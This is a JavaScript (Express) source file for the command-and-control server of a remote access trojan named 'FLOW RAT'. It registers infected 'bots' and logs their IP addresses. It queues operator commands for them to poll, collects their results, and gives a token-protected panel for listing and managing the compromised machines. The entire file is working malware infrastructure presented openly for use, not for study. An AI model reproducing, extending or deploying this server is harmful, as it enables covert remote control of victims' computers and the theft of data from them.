const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '10mb' }));

const PORT = process.env.PORT || 3000;
const AUTH_TOKEN = process.env.AUTH_TOKEN || 'flow-secret-token-2026';

// ====== STORAGE (in-memory) ======
const bots = {};

// ====== MIDDLEWARE AUTH ======
function requireAuth(req, res, next) {
    const token = req.headers['x-auth-token'] || req.query.token;
    if (token !== AUTH_TOKEN) {
        return res.status(401).json({ error: 'unauthorized' });
    }
    next();
}

// ====== HEALTH ======
app.get('/', (req, res) => {
    res.json({
        status: 'FLOW RAT Server Running',
        time: new Date().toISOString(),
        bots_total: Object.keys(bots).length,
        version: '1.0.0'
    });
});

// ====== BOT REGISTER ======
app.post('/rat/register', (req, res) => {
    const { bot_id, info } = req.body;
    if (!bot_id) return res.status(400).json({ error: 'bot_id required' });

    if (!bots[bot_id]) {
        bots[bot_id] = { commands: [], last_result: null };
    }
    bots[bot_id].info = info || '-';
    bots[bot_id].last_seen = new Date().toISOString();
    bots[bot_id].ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-';

    console.log(`[BOT] register: ${bot_id} | ${info}`);
    res.json({ status: 'ok', bot_id });
});

// ====== BOT POLL ======
app.get('/rat/poll/:bot_id', (req, res) => {
    const { bot_id } = req.params;
    if (!bots[bot_id]) return res.json({});

    bots[bot_id].last_seen = new Date().toISOString();
    const cmd = bots[bot_id].commands.shift();
    res.json(cmd || {});
});

// ====== BOT SEND RESULT ======
app.post('/rat/result', (req, res) => {
    const { bot_id, result, cmd_id } = req.body;
    if (bots[bot_id]) {
        bots[bot_id].last_result = {
            cmd_id: cmd_id || null,
            result: result || '',
            time: new Date().toISOString()
        };
        console.log(`[BOT] result from ${bot_id}: ${result}`);
    }
    res.json({ status: 'ok' });
});

// ====== PANEL SEND COMMAND (AUTH) ======
app.post('/rat/command', requireAuth, (req, res) => {
    const { bot_id, command, arg } = req.body;
    if (!bot_id || !command) {
        return res.status(400).json({ error: 'bot_id & command required' });
    }

    if (!bots[bot_id]) {
        bots[bot_id] = { commands: [], last_result: null, info: '-', last_seen: '-' };
    }

    bots[bot_id].commands.push({
        id: Date.now(),
        cmd: command,
        arg: arg || '',
        created: new Date().toISOString()
    });

    console.log(`[CMD] ${command} → ${bot_id}${arg ? ' | ' + arg : ''}`);
    res.json({ status: 'queued', bot_id, command });
});

// ====== PANEL LIST BOTS (AUTH) ======
app.get('/rat/bots', requireAuth, (req, res) => {
    const list = Object.keys(bots).map(id => {
        const b = bots[id];
        const isOnline = b.last_seen && (Date.now() - new Date(b.last_seen).getTime()) < 60000;
        return {
            id,
            info: b.info,
            ip: b.ip,
            last_seen: b.last_seen,
            last_result: b.last_result,
            pending: b.commands.length,
            status: isOnline ? 'online' : 'offline'
        };
    });
    res.json({ bots: list, total: list.length });
});

// ====== PANEL GET RESULT (AUTH) ======
app.get('/rat/result/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    if (!bots[bot_id]) return res.json({ result: null });
    res.json({ result: bots[bot_id].last_result });
});

// ====== DELETE BOT (AUTH) ======
app.delete('/rat/bot/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    delete bots[bot_id];
    res.json({ status: 'deleted' });
});

// ====== CLEAR QUEUE (AUTH) ======
app.delete('/rat/queue/:bot_id', requireAuth, (req, res) => {
    const { bot_id } = req.params;
    if (bots[bot_id]) bots[bot_id].commands = [];
    res.json({ status: 'cleared' });
});

// ====== 404 ======
app.use((req, res) => {
    res.status(404).json({ error: 'not found', path: req.path });
});

app.listen(PORT, () => {
    console.log(`[FLOW RAT] Server running on port ${PORT}`);
    console.log(`[FLOW RAT] Auth token: ${AUTH_TOKEN}`);
});
